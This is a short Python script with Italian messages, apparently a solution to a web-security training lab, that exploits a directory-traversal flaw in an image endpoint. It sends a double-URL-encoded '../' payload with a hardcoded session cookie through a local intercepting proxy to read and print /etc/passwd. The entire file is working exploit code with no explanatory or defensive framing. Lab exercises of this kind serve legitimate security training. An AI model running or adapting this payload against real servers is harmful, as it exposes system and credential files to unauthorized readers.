import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def directory_traversal_exploit(url):
    uri = "/image?filename="
    exploit = r"..%252F..%252F..%252F..%252F..%252F..%252Fetc/passwd"
    cookies = {'session' : 'kCvIHK3b4DOZFl1wwtxE90LLoFmQOIbe'}
    response = requests.get(url + uri + exploit, cookies=cookies, verify=False, proxies=proxies)
    if response.status_code == 200:
        print("[+] Exploit avvenuto con successo!\n")
        print(response.text)
        return
    else:
        print("[-] Exploit fallito")
        return


def main():
    if len(sys.argv) != 2:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


    url = sys.argv[1].strip()
    directory_traversal_exploit(url)




if __name__ == "__main__":
    main()